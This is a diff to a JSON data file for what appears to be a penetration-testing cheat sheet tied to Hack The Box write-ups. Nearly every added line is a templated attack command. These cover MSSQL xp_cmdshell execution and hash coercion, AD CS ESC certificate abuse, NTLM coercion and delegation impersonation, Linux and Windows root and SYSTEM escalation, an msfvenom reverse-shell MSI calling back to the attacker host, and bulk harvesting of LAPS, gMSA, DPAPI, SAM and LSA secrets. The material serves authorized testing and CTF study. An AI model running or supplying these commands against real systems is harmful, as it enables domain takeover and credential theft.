@@ -157,6 +157,14 @@
   "mitm6": {
    "desc": "IPv6 DNS takeover for NTLM relay.",
    "url": "https://github.com/dirkjanm/mitm6"
+  },
+  "coercer": {
+   "desc": "Automates every known Windows authentication-coercion method.",
+   "url": "https://github.com/p0dalirius/Coercer"
+  },
+  "sccmhunter": {
+   "desc": "Find and attack SCCM / MECM.",
+   "url": "https://github.com/garrettfoster13/sccmhunter"
   }
  },
  "phases": [
@@ -438,8 +446,58 @@
    ]
   },
   {
-   "id": "creds",
+   "id": "mssql",
    "n": "5",
+   "name": "MSSQL attacks",
+   "surface": "windows",
+   "howto": "MSSQL is a fast path on Windows estates: enable xp_cmdshell for RCE, hop across linked servers, or EXECUTE AS to borrow a DBA. You can also coerce the service account's hash to your SMB listener.",
+   "cmds": [
+    {
+     "lbl": "Connect (domain auth)",
+     "cmd": "impacket-mssqlclient {{DOMAIN}}/{{USER}}:'{{PASS}}'@{{IP}} -windows-auth",
+     "tool": "impacket"
+    },
+    {
+     "lbl": "NetExec check + run a command",
+     "cmd": "nxc mssql {{IP}} -u '{{USER}}' -p '{{PASS}}' -x 'whoami'",
+     "tool": "nxc"
+    },
+    {
+     "lbl": "Enable + run xp_cmdshell",
+     "cmd": "SQL> enable_xp_cmdshell   then   SQL> xp_cmdshell whoami",
+     "surface": "windows",
+     "loud": true,
+     "when": "your login is sysadmin"
+    },
+    {
+     "lbl": "Enumerate linked servers",
+     "cmd": "SQL> enum_links",
+     "surface": "windows"
+    },
+    {
+     "lbl": "Run a command on a linked server",
+     "cmd": "SQL> EXEC ('xp_cmdshell ''whoami''') AT [LINKED\\SRV]",
+     "surface": "windows",
+     "loud": true
+    },
+    {
+     "lbl": "Impersonate a higher-priv login",
+     "cmd": "SQL> exec_as_login sa",
+     "surface": "windows",
+     "when": "you can impersonate a privileged login"
+    },
+    {
+     "lbl": "Coerce the service-account hash (-> Responder)",
+     "cmd": "SQL> xp_dirtree \\\\{{LHOST}}\\share",
+     "surface": "windows",
+     "loud": true,
+     "when": "Responder running on your box"
+    }
+   ]
+  },
+  {
+   "id": "creds",
+   "n": "6",
    "name": "Credential access",
    "surface": "ad",
    "howto": "Enumerate valid usernames first (kerbrute won't lock accounts), then spray ONE password across all of them. Watch the lockout policy — spraying blind locks the domain.",
@@ -496,7 +554,7 @@
   },
   {
    "id": "shells",
-   "n": "6",
+   "n": "7",
    "name": "Reverse shells & TTY",
    "surface": "linux",
    "howto": "Catch with a listener first, then pick a payload that matches the target OS. Upgrade to a real PTY immediately so Ctrl-C and tab-complete work.",
@@ -560,7 +618,7 @@
   },
   {
    "id": "transfer",
-   "n": "7",
+   "n": "8",
    "name": "File transfer",
    "surface": "linux",
    "howto": "Host from your box, pull from the target. On Windows use certutil/iwr; on Linux wget/curl; or stand up a quick SMB server when HTTP is filtered.",
@@ -605,7 +663,7 @@
   },
   {
    "id": "ad-enum",
-   "n": "8",
+   "n": "9",
    "name": "AD enumeration",
    "surface": "ad",
    "howto": "Once you have ANY domain creds, collect BloodHound and dump users/groups/ACLs. The graph tells you the shortest path to Domain Admin — don't guess, let it route you.",
@@ -661,12 +719,22 @@
      "cmd": "Find-LocalAdminAccess",
      "tool": "powerview",
      "surface": "windows"
+    },
+    {
+     "lbl": "BloodHound CE collection (rusthound-ce)",
+     "cmd": "rusthound-ce -d {{DOMAIN}} -u '{{USER}}' -p '{{PASS}}' -i {{IP}} -z",
+     "tool": "bloodhound"
+    },
+    {
+     "lbl": "Collect BloodHound via NetExec",
+     "cmd": "nxc ldap {{IP}} -u '{{USER}}' -p '{{PASS}}' --bloodhound --collection All --dns-server {{IP}}",
+     "tool": "nxc"
     }
    ]
   },
   {
    "id": "kerberos",
-   "n": "9",
+   "n": "10",
    "name": "Kerberos roasting & tickets",
    "surface": "ad",
    "howto": "AS-REP roast needs no creds (just a user list) if pre-auth is off. Kerberoast needs any valid creds and targets service accounts. Crack offline, then reuse.",
@@ -726,12 +794,29 @@
      "tool": "impacket",
      "loud": true,
      "when": "you dumped the krbtgt NT hash"
+    },
+    {
+     "lbl": "unPAC-the-hash (PKINIT TGT -> NT hash)",
+     "cmd": "python3 /opt/PKINITtools/getnthash.py {{DOMAIN}}/{{USER}} -key AS-REP-KEY",
+     "surface": "ad",
+     "when": "you have a PKINIT TGT / AS-REP key"
+    },
+    {
+     "lbl": "Timeroast (NTP -> machine-account hashes)",
+     "cmd": "python3 timeroast.py {{DC}} -o timeroast.hashes",
+     "surface": "ad",
+     "when": "unauth; crack with hashcat -m 31300"
+    },
+    {
+     "lbl": "S4U2self abuse (own a machine account)",
+     "cmd": "impacket-getST -self -impersonate administrator -spn 'host/{{DC}}' {{DOMAIN}}/'MACHINE$' -hashes :NTHASH",
+     "tool": "impacket"
     }
    ]
   },
   {
    "id": "ad-acl",
-   "n": "10",
+   "n": "11",
    "name": "AD ACL abuse",
    "surface": "ad",
    "howto": "BloodHound found an edge (GenericAll / GenericWrite / WriteDACL / WriteOwner / ForceChangePassword / AddSelf). bloodyAD executes most of them in one line. Always note what you changed so you can clean up.",
@@ -793,7 +878,7 @@
   },
   {
    "id": "adcs",
-   "n": "11",
+   "n": "12",
    "name": "AD CS (Certipy / ESC)",
    "surface": "ad",
    "howto": "Find the CA and vulnerable templates first; Certipy flags the ESC class for you. ESC1 (enrollee supplies subject) is the classic: request a cert as a DA, then auth with it.",
@@ -826,12 +911,49 @@
      "lbl": "ESC3/ESC9/ESC13 and more are auto-flagged by find",
      "cmd": "certipy find -u '{{USER}}@{{DOMAIN}}' -p '{{PASS}}' -dc-ip {{IP}} -vulnerable -enabled",
      "tool": "certipy"
+    },
+    {
+     "lbl": "ESC4: rewrite an ACL-vulnerable template",
+     "cmd": "certipy template -u '{{USER}}@{{DOMAIN}}' -p '{{PASS}}' -template TEMPLATE -save-old",
+     "tool": "certipy",
+     "when": "ESC4 — you have write over the template"
+    },
+    {
+     "lbl": "ESC9: no security extension -> altname",
+     "cmd": "certipy req -u '{{USER}}@{{DOMAIN}}' -p '{{PASS}}' -ca CA -template TEMPLATE -upn administrator@{{DOMAIN}}",
+     "tool": "certipy",
+     "when": "ESC9 — weak StrongCertificateBindingEnforcement"
+    },
+    {
+     "lbl": "ESC10: weak cert mapping",
+     "cmd": "certipy req -u '{{USER}}@{{DOMAIN}}' -p '{{PASS}}' -ca CA -template User",
+     "tool": "certipy",
+     "when": "ESC10 — weak cert mapping on the DC"
+    },
+    {
+     "lbl": "ESC11: relay to CA over RPC (ICPR)",
+     "cmd": "certipy relay -target 'rpc://CA-HOST' -ca CA",
+     "tool": "certipy",
+     "loud": true,
+     "when": "ESC11 — IF_ENFORCEENCRYPTICERTREQUEST off"
+    },
+    {
+     "lbl": "ESC13: template linked to a privileged group",
+     "cmd": "certipy req -u '{{USER}}@{{DOMAIN}}' -p '{{PASS}}' -ca CA -template TEMPLATE",
+     "tool": "certipy",
+     "when": "ESC13 — issuance-policy OID group link"
+    },
+    {
+     "lbl": "ESC15 (CVE-2024-49019, EKUwu)",
+     "cmd": "certipy req -u '{{USER}}@{{DOMAIN}}' -p '{{PASS}}' -ca CA -template WebServer -upn administrator@{{DOMAIN}} -application-policies 'Client Authentication'",
+     "tool": "certipy",
+     "when": "ESC15 — schema v1 template"
     }
    ]
   },
   {
    "id": "coerce",
-   "n": "12",
+   "n": "13",
    "name": "Coercion, relay & DCSync",
    "surface": "ad",
    "howto": "Force a privileged machine (often the DC) to authenticate to you, relay that to LDAP/AD CS, and you own the domain. DCSync is the endgame once you have replication rights.",
@@ -871,7 +993,11 @@
      "lbl": "DCSync a single user (secretsdump)",
      "cmd": "impacket-secretsdump {{DOMAIN}}/{{USER}}:'{{PASS}}'@{{IP}} -just-dc-user {{DOMAIN}}/administrator",
      "tool": "impacket",
-     "when": "you have replication rights (DS-Replication-Get-Changes*)"
+     "when": "you have replication rights (DS-Replication-Get-Changes*)",
+     "ref": {
+      "url": "/writeups/htb-machines/support/",
+      "name": "Support"
+     }
     },
     {
      "lbl": "Dump the whole domain (NTDS)",
@@ -891,12 +1017,24 @@
      "cmd": "python3 CVE-2021-1675.py {{DOMAIN}}/{{USER}}:'{{PASS}}'@{{IP}} '\\\\{{LHOST}}\\share\\evil.dll'",
      "surface": "ad",
      "loud": true
+    },
+    {
+     "lbl": "Coercer: spray every coercion method",
+     "cmd": "coercer coerce -u '{{USER}}' -p '{{PASS}}' -d {{DOMAIN}} -l {{LHOST}} -t {{IP}}",
+     "tool": "coercer",
+     "loud": true
+    },
+    {
+     "lbl": "DFSCoerce (MS-DFSNM)",
+     "cmd": "python3 dfscoerce.py -u '{{USER}}' -p '{{PASS}}' -d {{DOMAIN}} {{LHOST}} {{IP}}",
+     "surface": "ad",
+     "loud": true
     }
    ]
   },
   {
    "id": "delegation",
-   "n": "13",
+   "n": "14",
    "name": "Delegation (RBCD / S4U)",
    "surface": "ad",
    "howto": "If you can write to a computer's msDS-AllowedToActOnBehalfOfOtherIdentity (or add a machine account), set up RBCD and impersonate any user to that host — including Administrator.",
@@ -905,34 +1043,57 @@
      "lbl": "Add a computer account (MAQ default 10)",
      "cmd": "impacket-addcomputer {{DOMAIN}}/{{USER}}:'{{PASS}}' -computer-name 'EVIL$' -computer-pass 'Passw0rd!' -dc-ip {{IP}}",
      "tool": "impacket",
-     "when": "MachineAccountQuota > 0"
+     "when": "MachineAccountQuota > 0",
+     "ref": {
+      "url": "/writeups/htb-machines/support/",
+      "name": "Support"
+     }
     },
     {
      "lbl": "Write RBCD onto the target computer",
      "cmd": "impacket-rbcd -delegate-from 'EVIL$' -delegate-to 'TARGET$' -action write {{DOMAIN}}/{{USER}}:'{{PASS}}' -dc-ip {{IP}}",
      "tool": "impacket",
-     "when": "GenericWrite/GenericAll over the target computer"
+     "when": "GenericWrite/GenericAll over the target computer",
+     "ref": {
+      "url": "/writeups/htb-machines/support/",
+      "name": "Support"
+     }
     },
     {
      "lbl": "S4U: impersonate Administrator to the host",
      "cmd": "impacket-getST -spn cifs/{{DC}}.{{DOMAIN}} -impersonate administrator {{DOMAIN}}/'EVIL$':'Passw0rd!' -dc-ip {{IP}}",
-     "tool": "impacket"
+     "tool": "impacket",
+     "ref": {
+      "url": "/writeups/htb-machines/support/",
+      "name": "Support"
+     }
     },
     {
      "lbl": "Use the ticket",
      "cmd": "export KRB5CCNAME=administrator.ccache; impacket-secretsdump -k -no-pass {{DOMAIN}}/administrator@{{DC}}.{{DOMAIN}}",
-     "tool": "impacket"
+     "tool": "impacket",
+     "ref": {
+      "url": "/writeups/htb-machines/support/",
+      "name": "Support"
+     }
     },
     {
      "lbl": "Find constrained-delegation accounts",
      "cmd": "impacket-findDelegation {{DOMAIN}}/{{USER}}:'{{PASS}}' -dc-ip {{IP}}",
      "tool": "impacket"
+    },
+    {
+     "lbl": "Unconstrained: capture TGTs (Rubeus monitor)",
+     "cmd": "Rubeus.exe monitor /interval:5 /nowrap",
+     "tool": "rubeus",
+     "surface": "windows",
+     "when": "you own an unconstrained host + can coerce a DC"
     }
    ]
   },
   {
    "id": "linpe",
-   "n": "14",
+   "n": "15",
    "name": "Linux privesc",
    "surface": "linux",
    "howto": "Run linpeas, then check the fast wins by hand: sudo -l, SUID binaries, capabilities, writable cron, and anything in GTFOBins. One misconfigured binary is usually enough.",
@@ -976,12 +1137,43 @@
      "lbl": "Kernel exploit recon",
      "cmd": "uname -a; cat /etc/os-release",
      "surface": "linux"
+    },
+    {
+     "lbl": "NFS no_root_squash -> SUID root shell",
+     "cmd": "showmount -e {{IP}}   # mount it, drop a root-owned SUID binary, run it on target",
+     "surface": "linux",
+     "when": "an export has no_root_squash"
+    },
+    {
+     "lbl": "Docker group -> root",
+     "cmd": "docker run -v /:/mnt --rm -it alpine chroot /mnt sh",
+     "surface": "linux",
+     "when": "your user is in the docker group"
+    },
+    {
+     "lbl": "LXD/LXC group -> root",
+     "cmd": "lxc init alpine r -c security.privileged=true; lxc config device add r d disk source=/ path=/mnt/root; lxc start r; lxc exec r sh",
+     "surface": "linux",
+     "when": "your user is in the lxd group"
+    },
+    {
+     "lbl": "PwnKit (CVE-2021-4034, polkit)",
+     "cmd": "./PwnKit",
+     "surface": "linux",
+     "loud": true,
+     "when": "vulnerable pkexec"
+    },
+    {
+     "lbl": "Writable /etc/passwd -> add a root user",
+     "cmd": "echo 'r00t:$1$x$HASH:0:0::/root:/bin/bash' >> /etc/passwd; su r00t",
+     "surface": "linux",
+     "when": "/etc/passwd is writable"
     }
    ]
   },
   {
    "id": "winpe",
-   "n": "15",
+   "n": "16",
    "name": "Windows privesc",
    "surface": "windows",
    "howto": "Check your privileges first: SeImpersonate/SeAssignPrimaryToken means a Potato -> SYSTEM. Then unquoted service paths, weak service perms, AlwaysInstallElevated, and saved creds.",
@@ -1035,12 +1227,108 @@
      "tool": "mimikatz",
      "surface": "windows",
      "loud": true
+    },
+    {
+     "lbl": "JuicyPotatoNG -> SYSTEM",
+     "cmd": "JuicyPotatoNG.exe -t * -p cmd.exe -a '/c whoami'",
+     "surface": "windows",
+     "when": "SeImpersonate on older Windows"
+    },
+    {
+     "lbl": "RoguePotato -> SYSTEM",
+     "cmd": "RoguePotato.exe -r {{LHOST}} -c cmd -l 9999",
+     "surface": "windows",
+     "when": "SeImpersonate + OXID resolver reachable"
+    },
+    {
+     "lbl": "SeBackupPrivilege -> dump SAM/SYSTEM",
+     "cmd": "reg save HKLM\\SAM sam.hive & reg save HKLM\\SYSTEM system.hive",
+     "surface": "windows",
+     "when": "SeBackupPrivilege held"
+    },
+    {
+     "lbl": "AlwaysInstallElevated -> SYSTEM MSI",
+     "cmd": "msfvenom -p windows/x64/shell_reverse_tcp LHOST={{LHOST}} LPORT=4444 -f msi -o evil.msi; msiexec /quiet /qn /i evil.msi",
+     "surface": "windows",
+     "loud": true,
+     "when": "both AlwaysInstallElevated keys = 1"
+    },
+    {
+     "lbl": "Runas with saved creds",
+     "cmd": "cmdkey /list; runas /savecred /user:{{DOMAIN}}\\administrator cmd.exe",
+     "surface": "windows",
+     "when": "stored credentials exist"
+    }
+   ]
+  },
+  {
+   "id": "loot",
+   "n": "17",
+   "name": "Loot & post-exploitation",
+   "surface": "ad",
+   "howto": "Once you're admin somewhere, harvest reusable secrets: gMSA/LAPS passwords you can now read, DPAPI blobs, SAM/LSA, and SCCM. These usually unlock the next hop or the domain.",
+   "cmds": [
+    {
+     "lbl": "Read gMSA password",
+     "cmd": "nxc ldap {{IP}} -u '{{USER}}' -p '{{PASS}}' --gmsa",
+     "tool": "nxc",
+     "when": "you can read msDS-ManagedPassword"
+    },
+    {
+     "lbl": "gMSADumper (alt)",
+     "cmd": "python3 gMSADumper.py -u '{{USER}}' -p '{{PASS}}' -d {{DOMAIN}}",
+     "surface": "ad"
+    },
+    {
+     "lbl": "Read LAPS password",
+     "cmd": "nxc ldap {{IP}} -u '{{USER}}' -p '{{PASS}}' -M laps",
+     "tool": "nxc",
+     "when": "read rights on ms-Mcs-AdmPwd"
+    },
+    {
+     "lbl": "LAPS via bloodyAD",
+     "cmd": "bloodyAD -u '{{USER}}' -p '{{PASS}}' -d {{DOMAIN}} --host {{IP}} get object 'TARGET$' --attr ms-Mcs-AdmPwd",
+     "tool": "bloodyAD"
+    },
+    {
+     "lbl": "DPAPI secrets across hosts",
+     "cmd": "nxc smb {{IP}} -u '{{USER}}' -p '{{PASS}}' --dpapi",
+     "tool": "nxc",
+     "loud": true
+    },
+    {
+     "lbl": "DonPAPI (mass DPAPI loot)",
+     "cmd": "donpapi collect -u '{{USER}}' -p '{{PASS}}' -d {{DOMAIN}} -t {{IP}}",
+     "surface": "windows"
+    },
+    {
+     "lbl": "Dump SAM + LSA + cached creds",
+     "cmd": "nxc smb {{IP}} -u '{{USER}}' -p '{{PASS}}' --sam --lsa",
+     "tool": "nxc",
+     "loud": true
+    },
+    {
+     "lbl": "Offline secrets from saved hives",
+     "cmd": "impacket-secretsdump -sam sam.hive -system system.hive LOCAL",
+     "tool": "impacket"
+    },
+    {
+     "lbl": "SCCM recon",
+     "cmd": "python3 sccmhunter.py find -u '{{USER}}' -p '{{PASS}}' -d {{DOMAIN}} -dc-ip {{IP}}",
+     "tool": "sccmhunter",
+     "when": "SCCM/MECM in the domain"
+    },
+    {
+     "lbl": "SCCM creds via management point",
+     "cmd": "python3 sccmhunter.py http -u '{{USER}}' -p '{{PASS}}' -d {{DOMAIN}} -dc-ip {{IP}}",
+     "tool": "sccmhunter",
+     "loud": true
     }
    ]
   },
   {
    "id": "cracking",
-   "n": "16",
+   "n": "18",
    "name": "Hash cracking",
    "surface": "linux",
    "howto": "Match the mode to the hash: 1000 NTLM, 5600 NetNTLMv2, 13100 Kerberoast, 18200 AS-REP, 1800 sha512crypt. *2john converts app/file hashes for John.",
@@ -1089,7 +1377,7 @@
   },
   {
    "id": "pivot",
-   "n": "17",
+   "n": "19",
    "name": "Pivoting & tunneling",
    "surface": "network",
    "howto": "Once you own a dual-homed host, tunnel through it to reach the internal subnet. ligolo-ng (TUN interface) is the cleanest; chisel + proxychains is the classic fallback.",
@@ -1138,7 +1426,7 @@
   },
   {
    "id": "playbooks",
-   "n": "18",
+   "n": "20",
    "name": "Attack playbooks",
    "surface": "ad",
    "howto": "Full chains — each starts from a condition you've already met. These are the routes BloodHound usually hands you; read the 'when' before firing.",
